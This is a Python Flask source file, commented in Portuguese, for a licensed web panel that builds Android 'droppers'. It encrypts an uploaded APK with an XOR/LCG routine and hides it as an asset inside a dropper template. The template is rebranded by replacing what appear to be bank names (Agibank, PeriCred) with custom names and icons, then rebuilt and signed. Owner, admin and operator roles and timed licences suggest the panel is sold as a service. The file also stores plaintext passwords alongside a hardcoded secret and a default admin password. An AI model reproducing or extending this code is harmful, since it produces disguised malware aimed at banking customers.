from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for
import os
import subprocess
import shutil
import xml.etree.ElementTree as ET
from werkzeug.utils import secure_filename
import threading
import json
from datetime import datetime, timedelta
import time
import zipfile
import uuid

app = Flask(__name__)
app.secret_key = 'siberian_remote_secret_2026'
app.config['MAX_CONTENT_LENGTH'] = 2048 * 1024 * 1024
app.config['SESSION_COOKIE_SECURE'] = False
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
app.config['UPLOAD_FOLDER'] = os.path.join(BASE_DIR, 'uploads')
app.config['OUTPUT_FOLDER'] = os.path.join(BASE_DIR, 'outputs')
DATA_DIR = os.path.join(BASE_DIR, 'apk_dropper')
DATA_FILE = os.path.join(DATA_DIR, 'data.json')

for d in [app.config['UPLOAD_FOLDER'], app.config['OUTPUT_FOLDER'], DATA_DIR]:
    os.makedirs(d, exist_ok=True)

DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")

SEED = 276813
BUILD_STATUS = {}

# ===== GESTÃO DE DADOS COM SISTEMA DE LICENCIAMENTO =====
def load_data():
    if not os.path.exists(DATA_FILE):
        initial_data = {
            "users": {
                "admin": {
                    "password": "admin123",
                    "role": "owner",
                    "created_at": datetime.now().isoformat(),
                    "license_days": None,  # Owner tem acesso ilimitado
                    "license_expires_at": None,
                    "status": "active",
                    "builds": [],
                    "team_id": None,
                    "amplification": {"total_builds": 0, "successful_builds": 0, "failed_builds": 0}
                }
            },
            "teams": {},
            "history": [],
            "settings": {
                "max_users_per_admin": 10,
                "default_license_days": 30,
                "auto_cleanup_days": 7
            }
        }
        with open(DATA_FILE, 'w') as f: json.dump(initial_data, f, indent=4)
        return initial_data
    with open(DATA_FILE, 'r') as f:
        try:
            data = json.load(f)
            # Garantir estrutura mínima
            if "settings" not in data: data["settings"] = {"max_users_per_admin": 10, "default_license_days": 30, "auto_cleanup_days": 7}
            if "teams" not in data: data["teams"] = {}
            if "history" not in data: data["history"] = []
            return data
        except: 
            return {"users": {}, "teams": {}, "history": [], "settings": {"max_users_per_admin": 10, "default_license_days": 30, "auto_cleanup_days": 7}}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

def is_user_expired(user_data):
    """Verifica se o usuário expirou sua licença"""
    if user_data.get('status') == 'inactive': 
        return True
    
    # Owner nunca expira
    if user_data.get('role') == 'owner':
        return False
    
    license_expires_at = user_data.get('license_expires_at')
    if license_expires_at:
        try:
            exp_date = datetime.fromisoformat(license_expires_at)
            if datetime.now() > exp_date: 
                return True
        except: 
            pass
    return False

def get_user_role(username):
    data = load_data()
    if username in data["users"]:
        return data["users"][username].get("role", "operator")
    return None

def get_team_id(username):
    data = load_data()
    if username in data["users"]:
        return data["users"][username].get("team_id")
    return None

def can_manage_user(current_user, target_user):
    """Verifica se current_user pode gerenciar target_user"""
    data = load_data()
    current_role = data["users"].get(current_user, {}).get("role")
    target_role = data["users"].get(target_user, {}).get("role")
    
    if current_role == "owner": 
        return True
    if current_role == "admin":
        if target_role == "operator":
            current_team = data["users"][current_user].get("team_id")
            target_team = data["users"][target_user].get("team_id")
            return current_team == target_team
    return False

def add_history(user, action, details):
    data = load_data()
    data["history"].insert(0, {
        "user": user, 
        "action": action, 
        "details": details, 
        "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    })
    data["history"] = data["history"][:500]
    save_data(data)

def add_build_history(username, app_name, status, build_id):
    data = load_data()
    if username in data["users"]:
        if "builds" not in data["users"][username]: 
            data["users"][username]["builds"] = []
        data["users"][username]["builds"].insert(0, {
            "build_id": build_id, 
            "app_name": app_name, 
            "status": status, 
            "timestamp": datetime.now().isoformat(), 
            "date_display": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        })
        data["users"][username]["builds"] = data["users"][username]["builds"][:500]
        save_data(data)

def update_amplification(username, build_status):
    """Atualiza estatísticas de amplificação do usuário"""
    data = load_data()
    if username in data["users"]:
        if "amplification" not in data["users"][username]:
            data["users"][username]["amplification"] = {"total_builds": 0, "successful_builds": 0, "failed_builds": 0}
        
        data["users"][username]["amplification"]["total_builds"] += 1
        if build_status == "concluido":
            data["users"][username]["amplification"]["successful_builds"] += 1
        elif build_status == "erro":
            data["users"][username]["amplification"]["failed_builds"] += 1
        
        save_data(data)

def encrypt_lcg(data, seed):
    j = seed
    encrypted = bytearray()
    for byte in data:
        j = ((j * 1664525) + 1013904223) & 0xFFFFFFFF
        xor_val = (j >> 24) & 0xFF
        encrypted.append(byte ^ xor_val)
    return encrypted

# ===== PROCESSAMENTO DE APK =====
def process_apk(build_id, user_apk_path, custom_app_name, username, custom_icon_path=None):
    try:
        add_build_history(username, custom_app_name, "processando", build_id)
        BUILD_STATUS[build_id] = {"status": "Extraindo APK...", "progress": 15}
        user_apk_extracted = os.path.join(app.config['UPLOAD_FOLDER'], f"{build_id}_extracted")
        if os.path.exists(user_apk_extracted): 
            shutil.rmtree(user_apk_extracted)
        os.makedirs(user_apk_extracted, exist_ok=True)
        
        try:
            with zipfile.ZipFile(user_apk_path, 'r') as zip_ref: 
                zip_ref.extractall(user_apk_extracted)
        except:
            with zipfile.ZipFile(user_apk_path, 'r') as zip_ref:
                for member in zip_ref.namelist():
                    try: 
                        zip_ref.extract(member, user_apk_extracted)
                    except: 
                        pass
        
        if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
            BUILD_STATUS[build_id] = {"status": "Extraindo via Apktool...", "progress": 20}
            subprocess.run(f'java -jar "{APKTOOL_JAR}" d "{user_apk_path}" -o "{user_apk_extracted}" -f', shell=True)

        BUILD_STATUS[build_id] = {"status": "Preparando Dropper", "progress": 30}
        dropper_work = os.path.join(app.config['UPLOAD_FOLDER'], f"{build_id}_dropper")
        if os.path.exists(dropper_work): 
            shutil.rmtree(dropper_work)
        shutil.copytree(DROPPER_TEMPLATE, dropper_work)
        
        app_name = custom_app_name if custom_app_name else "App"
        if custom_icon_path and os.path.exists(custom_icon_path):
            for d in ["res/mipmap-hdpi", "res/mipmap-mdpi", "res/mipmap-xhdpi", "res/mipmap-xxhdpi", "res/mipmap-xxxhdpi"]:
                path = os.path.join(dropper_work, d)
                os.makedirs(path, exist_ok=True)
                for name in ["ic_launcher.png", "ic_launcher_round.png"]: 
                    shutil.copy2(custom_icon_path, os.path.join(path, name))
        
        strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
        if os.path.exists(strings_xml):
            try:
                tree = ET.parse(strings_xml)
                root = tree.getroot()
                for string in root.findall('string'):
                    if string.get('name') == "app_name": 
                        string.text = app_name
                tree.write(strings_xml, encoding='utf-8', xml_declaration=True)
            except: 
                pass
        
        # Substituição dinâmica
        for root_dir, _, files in os.walk(dropper_work):
            for file in files:
                if file.endswith((".smali", ".xml")):
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: 
                            content = f.read()
                        new_content = content.replace('PeriCred', app_name).replace('Agibank', app_name).replace('AgiBank', app_name)
                        if content != new_content:
                            with open(file_path, 'w', encoding='utf-8') as f: 
                                f.write(new_content)
                    except: 
                        pass
        
        BUILD_STATUS[build_id] = {"status": "Injetando Payload", "progress": 60}
        with open(user_apk_path, "rb") as f: 
            data = f.read()
        encrypted = b"\x00" * 16 + encrypt_lcg(data, SEED)
        payload_path = os.path.join(dropper_work, "assets/dbliqgnjl.dat")
        os.makedirs(os.path.dirname(payload_path), exist_ok=True)
        with open(payload_path, "wb") as f: 
            f.write(encrypted)
        
        BUILD_STATUS[build_id] = {"status": "Compilando APK", "progress": 80}
        unsigned_apk = os.path.join(app.config['OUTPUT_FOLDER'], f"{build_id}_unsigned.apk")
        
        if not os.path.exists(APKTOOL_JAR):
            raise Exception(f"apktool.jar não encontrado em {APKTOOL_JAR}")
            
        res_b = subprocess.run(f'java -jar "{APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"', shell=True, capture_output=True, text=True)
        if not os.path.exists(unsigned_apk):
            subprocess.run(f'java -jar "{APKTOOL_JAR}" empty-framework-dir', shell=True)
            res_b = subprocess.run(f'java -jar "{APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"', shell=True, capture_output=True, text=True)
            if not os.path.exists(unsigned_apk):
                raise Exception(f"Erro na compilação: {res_b.stderr}")
        
        BUILD_STATUS[build_id] = {"status": "Assinando APK", "progress": 90}
        output_dir = os.path.join(app.config['OUTPUT_FOLDER'], build_id)
        os.makedirs(output_dir, exist_ok=True)
        
        if not os.path.exists(SIGNER_JAR):
            raise Exception(f"signer.jar não encontrado em {SIGNER_JAR}")
            
        res_s = subprocess.run(f'java -jar "{SIGNER_JAR}" --apks "{unsigned_apk}" --out "{output_dir}"', shell=True, capture_output=True, text=True)
        
        final_apk = None
        if os.path.exists(output_dir):
            for f in os.listdir(output_dir):
                if f.endswith(".apk"):
                    final_apk = os.path.join(output_dir, f)
                    break
        
        if not final_apk: 
            raise Exception(f"Erro na assinatura: {res_s.stderr}")
            
        final_name = f"{secure_filename(app_name)}_dropper.apk"
        shutil.move(final_apk, os.path.join(app.config['OUTPUT_FOLDER'], final_name))
        BUILD_STATUS[build_id] = {"status": "Concluido", "progress": 100, "output_file": final_name}
        add_build_history(username, custom_app_name, "concluido", build_id)
        update_amplification(username, "concluido")
        add_history(username, "Build APK", f"App: {app_name}")
        
    except Exception as e:
        error_msg = str(e)
        print(f"ERRO NO BUILD {build_id}: {error_msg}")
        BUILD_STATUS[build_id] = {"status": f"Erro: {error_msg[:50]}...", "progress": 0, "error": True}
        add_build_history(username, custom_app_name, "erro", build_id)
        update_amplification(username, "erro")

# ===== ROTAS =====
@app.route('/check-session')
def check_session():
    if 'username' in session:
        data = load_data()
        user = data["users"].get(session['username'], {})
        if is_user_expired(user):
            session.clear()
            return jsonify({"logged_in": False, "expired": True})
        return jsonify({
            "logged_in": True, 
            "username": session['username'], 
            "role": user.get('role', 'operator'),
            "license_expires_at": user.get('license_expires_at')
        })
    return jsonify({"logged_in": False})

@app.route('/')
def index():
    if 'username' in session:
        data = load_data()
        user = data["users"].get(session['username'], {})
        if is_user_expired(user):
            session.clear()
            return render_template('index.html')
        return render_template('index.html', user=session['username'], role=user.get('role', 'operator'))
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('username'), data.get('password')
    db = load_data()
    if u in db['users'] and db['users'][u]['password'] == p:
        if is_user_expired(db['users'][u]): 
            return jsonify({"success": False, "message": "Licença expirada"}), 403
        session.permanent = True
        session['username'] = u
        session['role'] = db['users'][u].get('role', 'operator')
        add_history(u, "Login", "Acesso ao painel")
        return jsonify({"success": True, "role": session['role']})
    return jsonify({"success": False, "message": "Incorreto"}), 401

@app.route('/logout')
def logout():
    if 'username' in session: 
        add_history(session['username'], "Logout", "Saida")
    session.clear()
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_apk():
    if 'username' not in session: 
        return jsonify({"error": "Login"}), 401
    
    data = load_data()
    user = data["users"].get(session['username'], {})
    if is_user_expired(user):
        return jsonify({"error": "Licença expirada"}), 403
    
    file = request.files.get('file')
    if not file or not file.filename.endswith('.apk'): 
        return jsonify({"error": "Arquivo invalido"}), 400
    
    app_name = request.form.get('app_name', 'App')
    build_id = f"build_{int(time.time())}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], f"{build_id}_orig.apk")
    file.save(filepath)
    
    icon_path = None
    icon_file = request.files.get('icon')
    if icon_file and icon_file.filename:
        icon_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{build_id}_icon.png")
        icon_file.save(icon_path)
    
    thread = threading.Thread(target=process_apk, args=(build_id, filepath, app_name, session['username'], icon_path))
    thread.daemon = True
    thread.start()
    return jsonify({"build_id": build_id})

@app.route('/status/<build_id>')
def status(build_id):
    return jsonify(BUILD_STATUS.get(build_id, {"status": "Desconhecido", "progress": 0}))

@app.route('/download/<build_id>')
def download(build_id):
    if 'username' not in session: 
        return redirect(url_for('index'))
    status_info = BUILD_STATUS.get(build_id, {})
    if status_info.get('progress') == 100 and status_info.get('output_file'):
        file_path = os.path.join(app.config['OUTPUT_FOLDER'], status_info['output_file'])
        if os.path.exists(file_path):
            return send_file(file_path, as_attachment=True)
    return jsonify({"error": "Arquivo não disponível"}), 404

@app.route('/user/builds')
def user_builds():
    if 'username' not in session: 
        return jsonify([]), 401
    data = load_data()
    user = data["users"].get(session['username'], {})
    builds = user.get('builds', [])
    
    if session.get('role') == 'admin':
        team_id = user.get('team_id')
        all_builds = []
        for username, user_data in data["users"].items():
            if user_data.get('team_id') == team_id and user_data.get('role') == 'operator':
                all_builds.extend(user_data.get('builds', []))
        return jsonify(all_builds)
    
    if session.get('role') == 'owner':
        all_builds = []
        for username, user_data in data["users"].items():
            all_builds.extend(user_data.get('builds', []))
        return jsonify(all_builds)
    
    return jsonify(builds)

@app.route('/user/profile')
def user_profile():
    if 'username' not in session: 
        return jsonify({}), 401
    data = load_data()
    user = data["users"].get(session['username'], {})
    return jsonify({
        "username": session['username'],
        "role": user.get('role'),
        "status": user.get('status'),
        "license_expires_at": user.get('license_expires_at'),
        "amplification": user.get('amplification', {"total_builds": 0, "successful_builds": 0, "failed_builds": 0}),
        "created_at": user.get('created_at')
    })

@app.route('/admin/users')
def admin_users():
    if 'username' not in session: 
        return jsonify([]), 401
    data = load_data()
    current_user = session['username']
    current_role = data["users"].get(current_user, {}).get('role')
    
    if current_role == 'owner':
        users_list = []
        for username, user_data in data["users"].items():
            users_list.append({
                "username": username,
                "role": user_data.get('role'),
                "status": user_data.get('status'),
                "license_expires_at": user_data.get('license_expires_at'),
                "license_days": user_data.get('license_days'),
                "builds_count": len(user_data.get('builds', [])),
                "amplification": user_data.get('amplification', {})
            })
        return jsonify(users_list)
    
    if current_role == 'admin':
        team_id = data["users"][current_user].get('team_id')
        users_list = []
        for username, user_data in data["users"].items():
            if user_data.get('team_id') == team_id and user_data.get('role') == 'operator':
                users_list.append({
                    "username": username,
                    "role": user_data.get('role'),
                    "status": user_data.get('status'),
                    "license_expires_at": user_data.get('license_expires_at'),
                    "license_days": user_data.get('license_days'),
                    "builds_count": len(user_data.get('builds', [])),
                    "amplification": user_data.get('amplification', {})
                })
        return jsonify(users_list)
    
    return jsonify([])

@app.route('/admin/create-user', methods=['POST'])
def create_user():
    if 'username' not in session: 
        return jsonify({"success": False, "message": "Login"}), 401
    data = request.json
    new_username = data.get('username')
    new_password = data.get('password')
    new_role = data.get('role', 'operator')
    license_days = data.get('license_days', 30)
    
    db = load_data()
    current_user = session['username']
    current_role = db["users"].get(current_user, {}).get('role')
    
    if new_username in db['users']:
        return jsonify({"success": False, "message": "Usuário já existe"}), 400
    
    if current_role == 'owner':
        if new_role not in ['admin', 'operator']:
            return jsonify({"success": False, "message": "Role inválida"}), 400
        team_id = str(uuid.uuid4()) if new_role == 'admin' else db["users"][current_user].get('team_id')
    elif current_role == 'admin':
        new_role = 'operator'
        team_id = db["users"][current_user].get('team_id')
    else:
        return jsonify({"success": False, "message": "Sem permissão"}), 403
    
    # Calcular data de expiração
    license_expires_at = (datetime.now() + timedelta(days=license_days)).isoformat() if license_days else None
    
    db['users'][new_username] = {
        "password": new_password,
        "role": new_role,
        "created_at": datetime.now().isoformat(),
        "license_days": license_days,
        "license_expires_at": license_expires_at,
        "status": "active",
        "builds": [],
        "team_id": team_id,
        "amplification": {"total_builds": 0, "successful_builds": 0, "failed_builds": 0}
    }
    save_data(db)
    add_history(current_user, "Criar Usuário", f"Novo {new_role}: {new_username} ({license_days} dias)")
    return jsonify({"success": True, "message": f"{new_role.capitalize()} criado com sucesso"})

@app.route('/admin/renew-license', methods=['POST'])
def renew_license():
    if 'username' not in session: 
        return jsonify({"success": False, "message": "Login"}), 401
    
    data = request.json
    target_user = data.get('username')
    days = data.get('days', 30)
    
    db = load_data()
    current_user = session['username']
    
    if not can_manage_user(current_user, target_user):
        return jsonify({"success": False, "message": "Sem permissão"}), 403
    
    if target_user not in db['users']:
        return jsonify({"success": False, "message": "Usuário não encontrado"}), 404
    
    license_expires_at = (datetime.now() + timedelta(days=days)).isoformat()
    db['users'][target_user]['license_expires_at'] = license_expires_at
    db['users'][target_user]['license_days'] = days
    save_data(db)
    add_history(current_user, "Renovar Licença", f"Usuário: {target_user} (+{days} dias)")
    return jsonify({"success": True, "message": f"Licença renovada por {days} dias"})

@app.route('/admin/toggle-user', methods=['POST'])
def toggle_user():
    if 'username' not in session: 
        return jsonify({"success": False, "message": "Login"}), 401
    
    data = request.json
    target_user = data.get('username')
    
    db = load_data()
    current_user = session['username']
    
    if not can_manage_user(current_user, target_user):
        return jsonify({"success": False, "message": "Sem permissão"}), 403
    
    if target_user not in db['users']:
        return jsonify({"success": False, "message": "Usuário não encontrado"}), 404
    
    new_status = "inactive" if db['users'][target_user]['status'] == "active" else "active"
    db['users'][target_user]['status'] = new_status
    save_data(db)
    add_history(current_user, "Toggle Usuário", f"Usuário: {target_user} -> {new_status}")
    return jsonify({"success": True, "message": f"Usuário {new_status}"})

@app.route('/admin/delete-user', methods=['POST'])
def delete_user():
    if 'username' not in session: 
        return jsonify({"success": False, "message": "Login"}), 401
    
    data = request.json
    target_user = data.get('username')
    
    db = load_data()
    current_user = session['username']
    
    if not can_manage_user(current_user, target_user):
        return jsonify({"success": False, "message": "Sem permissão"}), 403
    
    if target_user not in db['users']:
        return jsonify({"success": False, "message": "Usuário não encontrado"}), 404
    
    if target_user == current_user:
        return jsonify({"success": False, "message": "Não pode deletar a si mesmo"}), 400
    
    del db['users'][target_user]
    save_data(db)
    add_history(current_user, "Deletar Usuário", f"Usuário: {target_user}")
    return jsonify({"success": True, "message": f"Usuário deletado"})

@app.route('/admin/history')
def admin_history():
    if 'username' not in session: 
        return jsonify([]), 401
    data = load_data()
    current_role = data["users"].get(session['username'], {}).get('role')
    
    if current_role == 'owner':
        return jsonify(data.get('history', []))
    
    return jsonify([])

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
